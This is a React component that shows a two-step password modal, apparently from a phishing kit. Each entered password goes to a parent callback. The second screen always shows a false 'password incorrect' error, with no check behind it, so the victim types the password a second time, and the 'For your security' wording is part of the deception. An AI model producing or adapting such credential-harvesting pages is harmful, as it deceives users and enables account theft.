import React from 'react';
import { useState } from 'react';
import { useForm } from "react-hook-form";
import styles from '../styles/password.module.css';


const Password = (props) => {
    const [steps, setSteps] = useState({first_password: true, second_password: false});
    const { register, handleSubmit } = useForm();

    const firstPasswordSubmit = async (data) => { 

        props.onSubmit({type: 'first-password', data:{firstPassword: data.password}});
        setSteps({first_password: false, second_password: true})

    }

    const secondPasswordSubmit = async (data) => { 
        props.onSubmit({type: 'second-password', data:{secondPassword: data.password}});
    }

    return <div className={styles.modal}>
        { steps.first_password && 
            <div className={styles.box}>
                <div className={styles.top}>
                    <h3>Please enter your password</h3>
                </div>
                <form onSubmit={handleSubmit(firstPasswordSubmit)}>
                    <p className={styles.securityInfo}>For your security, you must enter your password to continue.</p>

                    <div className={styles.input}>
                            <label>Password:</label>
                            <input type="password" required {...register("password")} />
                    </div>

                    <div className={styles.bottom}>
                            <button type="submit">Continue</button>
                    </div>
                </form>
            </div>
        }

        { steps.second_password && 
            <div className={styles.box}>
                <div className={styles.top}>
                        <h3>Please Re-Enter Your Password</h3>
                </div>
                <form onSubmit={handleSubmit(secondPasswordSubmit)}>
                    <p className={styles.securityInfo}>For your security, you must enter your password to continue.</p>

                        <div className={styles.input}>
                                <label>Password:</label>
                                <input type="password" required {...register("confirmPassword")} />
                                <p className={styles.error}>The password you&apos;ve entered is incorrect.</p>
                        </div>

                        <div className={styles.bottom}>
                                <button type="submit">Continue</button>
                        </div>
                </form>
            </div>
        }   
    </div>
}


export default Password;